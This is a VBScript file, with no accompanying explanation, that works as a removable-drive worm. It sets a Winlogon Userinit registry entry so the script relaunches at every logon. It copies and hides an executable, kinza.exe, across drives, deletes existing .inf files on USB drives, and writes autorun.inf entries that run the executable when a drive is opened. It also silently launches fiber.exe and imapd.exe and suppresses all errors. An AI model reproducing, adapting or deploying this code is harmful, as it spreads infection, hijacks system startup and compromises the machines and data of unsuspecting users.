Option Explicit
On Error Resume Next

Dim fso, Shells, WinDir, SystemDir, WriteAll, File, Drv, InDrive, ReadAll, AllFile, root, Count,Drives,Del,Chg,folder, files, just, Test

Set fso = CreateObject("Scripting.FileSystemObject")
Set Shells = CreateObject("Wscript.Shell")
Set WinDir = fso.GetSpecialFolder(0)
Set SystemDir = fso.GetSpecialFolder(1)
Set File = fso.GetFile(WScript.ScriptFullName)
Set Drv = File.Drive
Set InDrive = fso.drives

For Each Test In InDrive
	If fso.FileExists(Test.Path & "\kinza.exe") then
		Shells.Run "explorer.exe " & Test.Path & "\"
	End If
Next

	If fso.FileExists("fiber.exe") then
		Shells.Run "fiber.exe"
	End If
	If fso.FileExists("imapd.exe") then
		Shells.Run "imapd.exe"
	End If
	
Count=Drv.DriveType

Do
		Shells.RegWrite "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit",SystemDir & "\userinit.exe," & _
	SystemDir & "\wscript.exe " & SystemDir & "\boot.vbs"
	
For Each Drives In InDrive 

	If Not fso.FileExists(SystemDir & "\kinza.exe") Then
		If Drives.DriveType = 1 Or Drives.DriveType = 2 Then
			If Drives.Path<> "A:" Then
				If fso.FileExists(Drives.Path & "\kinza.exe") Then
					CopyTheFile Drives.Path & "\kinza.exe", SystemDir & "\kinza.exe"
				End If
			End If
		End If		
	End If

	
		If Drives.DriveType = 1 Then
			delext "inf",Drives.Path & "\"
			delext "INF",Drives.Path & "\"
		End if 

				If Drives.DriveType = 1 Then
					If Drives.Path<>"A:" Then
						If Not fso.FileExists(Drives.Path & "\kinza.exe") Then
							CopyTheFile SystemDir & "\kinza.exe", Drives.Path & "\kinza.exe"
							MakeFileHidden Drives.Path & "\kinza.exe"
						End If
				
						If fso.FileExists(Drives.Path & "\autorun.inf") Or fso.FileExists(Drives.Path & "\AUTORUN.INF") Then 
							Set Chg = fso.GetFile(Drives.Path & "\autorun.inf")
							Chg.Attributes = -8
							Set WriteAll = fso.CreateTextFile(Drives.Path & "\autorun.inf",2,True)
							WriteAll.writeline "[autorun]"
							WriteAll.WriteLine "open=kinza.exe"
							WriteAll.WriteLine "shell\open=Open"
							WriteAll.WriteLine "shell\open\Command=kinza.exe"
							WriteAll.WriteLine "shell\explore=Explore"
							WriteAll.WriteLine "shell\explore\Command=kinza.exe"
							WriteAll.Close
							MakeFileHidden Drives.Path & "\autorun.inf"
						else
							Set WriteAll = fso.CreateTextFile(Drives.Path & "\autorun.inf",2,True)
							WriteAll.writeline "[autorun]"
							WriteAll.WriteLine "open=kinza.exe"
							WriteAll.WriteLine "shell\open=Open"
							WriteAll.WriteLine "shell\open\Command=kinza.exe"
							WriteAll.WriteLine "shell\explore=Explore"
							WriteAll.WriteLine "shell\explore\Command=kinza.exe"
							WriteAll.Close
							MakeFileHidden Drives.Path & "\autorun.inf"
						End if
					End If
				End If
			
	Next






	if Count <> 1 then
	Wscript.sleep 10000
	end if

loop while Count<>1

'End your code here

'Create New Folder
Sub CreateNewFolder(FolderName)
	Dim fldr
   Set fldr = fso.CreateFolder(FolderName)
End Sub

'Delete Existing Folder
Sub DeleteNewFolder(FolderName)
	Dim fldr
	Set fldr = fso.DeleteFolder(FolderName)
End Sub

'Create a new text file
Sub CreateNewFile(FileName)
	Dim f0
	Set f0=fso.CreateTextFile(FileName)
End Sub

'Move a file to a location
Sub MoveTheFile(Source,Dest)
	Dim f1
	Set f1 = fso.GetFile(Source)
	f1.Move(Dest)
End Sub

'Copy a file to a location
Sub CopyTheFile(Source,Dest)
	Dim f2
	Set f2=fso.GetFile(Source)
	f2.Copy(dest)
End Sub

'Delete an existing File
Sub DeleteTheFile(Source)
	Dim f3
	Set f3=fso.GetFile(Source)
	f3.Delete
End Sub

'Copy an existing Folder
Sub CopyTheFolder(Source, Dest)
	Dim f4
	Set f4=fso.GetFolder(Source)
	f4.Copy(Dest)
End Sub

'Move an existing folder
Sub MoveTheFolder(Source,Dest)
	Dim f5
	Set f5=fso.GetFolder(Source)
	f5.Move(Dest)
End Sub

'Run your desired program
Sub RunTheProgram(ProgramName)
	Shells.Run(ProgramName)
End Sub

'Make a file hidden plus system
Sub MakeFileHidden(FileName)
	Dim f6
	Set f6=fso.GetFile(FileName)
	f6.Attributes=-1
End Sub

'Type extension to delete in File2Find, Path in the SrchPath
sub Delext(File2Find, SrchPath)
   Dim oFileSys, oFolder, oFile,Cut,Delete
   Set oFileSys = CreateObject("Scripting.FileSystemObject")
   Set oFolder = oFileSys.GetFolder(SrchPath)
   For Each oFile In oFolder.Files
		Cut=Right(oFile.Name,3)
		If UCase(Cut)=UCase(file2find) Then
			If oFile.Name <> "boot.vbs" Then Set Delete = oFileSys.DeleteFile(srchpath & oFile.Name,true)
		End If
   Next
End sub